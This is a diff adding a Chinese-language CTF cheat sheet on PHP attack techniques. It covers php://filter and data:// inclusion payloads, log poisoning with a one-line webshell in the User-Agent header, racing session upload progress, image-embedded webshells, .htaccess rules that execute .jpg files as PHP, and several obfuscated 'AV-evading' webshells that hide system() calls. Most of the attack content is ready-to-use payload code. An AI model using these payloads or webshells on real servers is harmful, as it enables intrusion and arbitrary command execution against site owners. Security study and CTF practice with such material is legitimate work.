@@ -1,0 +1,71 @@
+一、伪协议：
+
+?file=php://filter/convert.base64-encode/resource=flag.php(文件名)   用base64防止出现乱码情况，结果用base64形式输出
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==(被base64编码过的php代码)      base64为可选的加密形式
+?file=php://filter/read=string.rot13/resource=flag.php    用rot13的方式来读取flag.php的内
+?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php     同样的伪协议，不一样的过滤器
+过滤器绕过不需要执行的代码
+
+二、包含日志文件 进行getshell：
+
+在ua头里面写入一句话木马(因为ua头的信息会被写入到access.log里面)，再url后面写入包含日志?file=/var/log/nginx/access.log   再加上POST请求里面的密码1
+
+
+三、session文件包含：
+
+1.session.upload_progress.enabled = on
+2.session.upload_progress.cleanup = on
+3.session.upload_progress.prefix = “upload_progress_”
+4.session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS”
+5.session.use_strict_mode=off
+第一个表示当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中
+第二个表示当文件上传结束后，php将会立即清空对应session文件中的内容
+第三和第四个prefix+name将表示为session中的键名
+第五个表示我们对Cookie中sessionID可控
+linux系统中session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session,但是由于session.use_strict_mode=off，我们可以自定义名字，例如我们在Cookie中设置了PHPSESSID=flag，php会在服务器上创建文件：/tmp/sess_flag
+再加上读取以后，会立刻清除进度信息，就需要一个条件竞争进行执行，接下来就是白嫖session的脚本了(以后仔细去学py的对应模块的时候再自己手动写)
+
+文件上传里面的session：
+上传.user.ini的文件包含目录下auto_prepend_file/tmp_sess*,然后开启竞争
+
+二次渲染的png图片码，利用脚本生成，藏一句话木马，<?=$_GET[0]($_POST[1]);?>  在利用文件包含上传访问时，注意是否是POST请求头，还有Content-Type: application/x-www-form-urlencoded，否则没有返回
+ 
+二次渲染的jpg图片码，同样可以利用脚本生成，可自定义一句话木马，后面操作同上
+
+注意修改Content-Type值，如zip的为application/x-zip-compressed
+
+
+四、.htaccess漏洞
+apache服务器
+能够上传.htaccess文件，一般为黑名单限制。
+AllowOverride All，默认配置为关闭None。
+LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态
+上传目录具有可执行权限
+
+上传.htaccess文件  文件内容AddType application/x-httpd-php .jpg     该目录下.jpg的文件均按照php进行执行。
+
+
+五、免杀木马：
+<?php 
+    $poc="s#y#s#t#e#m"; 
+    $poc_1=explode("#",$poc); 
+    $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];
+    $poc_2($_REQUEST['1']);
+?>       #get请求  密码1
+
+<?php
+$a=substr('1s',1).'ystem';
+$a($_REQUEST[1]);
+?>
+
+<?php
+$a=strrev('metsys');
+$a($_REQUEST[1]);
+?>
+
+<?php
+$a=$_REQUEST['a'];
+$b=$_REQUEST['b'];
+$a($b);
+?>
+
